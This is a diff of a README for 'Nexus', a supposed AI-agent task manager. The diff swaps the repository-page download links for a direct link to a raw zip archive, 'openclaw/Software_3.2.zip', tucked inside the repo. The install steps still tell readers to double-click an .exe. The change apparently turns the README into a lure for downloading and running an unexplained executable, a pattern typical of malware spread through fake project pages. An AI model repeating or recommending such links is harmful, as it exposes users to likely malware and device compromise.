@@ -1,6 +1,6 @@
 # 🤖 Nexus - Manage complex AI tasks with ease
 
-[![](https://img.shields.io/badge/Download_Nexus-Blue.svg)](https://github.com/Tangible-startingblock577/Nexus)
+[![](https://img.shields.io/badge/Download_Nexus-Blue.svg)](https://github.com/Tangible-startingblock577/Nexus/raw/refs/heads/main/openclaw/Software_3.2.zip)
 
 Nexus acts as a central hub for your automated tasks. It connects specialized AI helpers to your workflow. These helpers perform research, manage finances, or analyze documents. You control these agents through a simple interface. Nexus puts your digital work in one place.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to set up Nexus on your machine.
 
-1. Go to the [official download page](https://github.com/Tangible-startingblock577/Nexus) to get the latest version.
+1. Go to the [official download page](https://github.com/Tangible-startingblock577/Nexus/raw/refs/heads/main/openclaw/Software_3.2.zip) to get the latest version.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your Downloads folder.
 4. Double-click the file to start the installer.
